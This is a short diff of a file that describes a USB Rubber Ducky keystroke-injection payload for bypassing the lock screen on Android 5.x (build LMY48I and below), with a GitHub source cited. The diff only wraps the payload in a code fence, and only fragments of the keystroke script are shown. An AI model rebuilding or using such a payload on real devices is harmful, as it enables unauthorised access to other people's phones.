@@ -1,7 +1,8 @@
 USB Rubber ducky payload to bypass lock-screen on 5.x build (LMY48I) and below.
 Source: https://github.com/aluech/Android-USB-Rubber-Duck
 
-'DELAY 5000
+```
+DELAY 5000
 SPACE
 DELAY 500
 SPACE
@@ -196,4 +197,5 @@ RIGHT
 DELAY 1000
 CTRL V
 DELAY 500
-STRING 11111'
+STRING 11111
+```
